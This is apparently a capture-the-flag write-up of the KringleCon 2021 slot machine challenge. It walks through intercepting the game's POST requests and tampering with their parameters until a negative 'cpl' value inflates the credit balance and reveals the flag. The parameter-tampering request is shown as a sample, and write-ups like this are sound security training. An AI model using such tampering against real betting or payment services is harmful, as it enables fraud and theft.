---
tags:
  - post
  - kringlecon2021Post
title: Kringlecon 2021 - Slot Machine Investigation
---
# Introduction
This challenge is all about exploiting Jacks slotsystem. Everything can be done in browser and I really reccommend using firefox, simply becuase the interface is less confusing.
The description for this challenge is:
*Test the security of Jack Frost's slot machines. What does the Jack Frost Tower casino security team threaten to do when your coin total exceeds 1000? Submit the string in the server data.response element. Talk to Noel Boetie outside Santa's Castle for help.* 
So the flag here is what the troll tells you when you reach over 1000 coins.

# Reconnaissance
The webpage for the slotmachines is amusing. It has no fields you can enter data. You can contorl how much you bet and the bet level, other than that you may spin/autospin or check how much each each troll is worth. With no possibility to enter or manipulate the values from the gui, lets check out the inspector tools.
I want to head on over to the networks tools just to check out the requests my computer is sending.
Appart from the header, I see that this is my payload
```
POST
betamount=1&numline=20&cpl=0.1

RESPONSE
{"success":true,"data":{"credit":98,"jackpot":0,"free_spin":0,"free_num":0,"scaler":0,"num_line":20,"bet_amount":1,"pull":{"WinAmount":0,"FreeSpin":0,"WildFixedIcons":[],"HasJackpot":false,"HasScatter":false,"WildColumIcon":"","ScatterPrize":0,"SlotIcons":["icon8","icon6","icon2","icon7","icon9","icon10","icon10","icon4","icon2","icon8","icon6","icon6","icon9","icon6","icon10"],"ActiveIcons":[],"ActiveLines":[]},"response":"Keep playing!"},"message":"Spin success"}
```
Ok so a legitmiate request has the betamount, number of lines we want to play with, and a cpl that I have no idea what does.
But the response tells us that the server pulls the following from its own end, the win amount, free spins, if I have won the jackpot and what trolls appear.

# Enumeration
I tried to combine different fields to try to manipulate the server to give me prizes I didn't have, such as:
```
POST
betamount=1&numline=20&cpl=0.1&HasJackpot=TRUE
Response
200 OK
{"success":true,"data":{"credit":96.5,"jackpot":0,"free...
(It ignored my jackpot)

POST
betamount=1&numline=20&cpl=0.1&credits=1000000
Response
200 OK
{"success":true,"data":{"credit":96.5,"jackpot":0,"free...
(It ignored my credits)

POST
betamount=1&numline=20&cpl=0.1&WinAmount=10000
Response
200 OK
{"success":true,"data":{"credit":96.5,"jackpot":0,"free...
(It ignored my WinAmount)

POST
betamount=10000&numline=20&cpl=0.1
RESPONSE
404 not enough credits

POST
betamount=-10&numline=20&cpl=0,1
RESPONSE
404 invalid betamount

POST
betamount=1&numline=200000&cpl=0.1
RESPONSE
404 not enough credits

POST
betamount=1&numline=-20&cpl=0,1
RESPONSE
200 OK
{"success":true,"data":{"credit":96.5,"jackpot":0,"free...
(It gave me nothing)

POST
betamount=1&numline=20&cpl=99999
RESPONSE
404 not enough credits

POST
betamount=1&numline=20&cpl=-100
RESPONSE
200 OK
{"success":true,"data":{"credit":2096.5,"jackpot":0,"free_...
```
Hold up, the last request gave us alot of credits, why?

# The vulneralbility
CPL didn't have the same checks as the others, becuase pre spin it doesn't affect our startcredits. I don't know exactly what it does, but it looks like it is always multiplied with the numline value and affects your total credits. 
Anyway, the flag: 
```
{"success":true,"data":{"credit":2096.5,"jackpot":0,"free_spin":0,"free_num":0,"scaler":0,"num_line":20,"bet_amount":1,"pull":{"WinAmount":-3000,"FreeSpin":0,"WildFixedIcons":[],"HasJackpot":false,"HasScatter":false,"WildColumIcon":"","ScatterPrize":0,"SlotIcons":["icon3","icon9","icon6","icon4","icon2","icon8","icon1","icon2","icon9","icon6","wild","wild","icon3","wild","icon9"],"ActiveIcons":[1,12,13,14],"ActiveLines":[20]},"response":"I'm going to have some bouncer trolls bounce you right out of this casino!"},"message":"Spin success"}
```
**"I'm going to have some bouncer trolls bounce you right out of this casino!"**
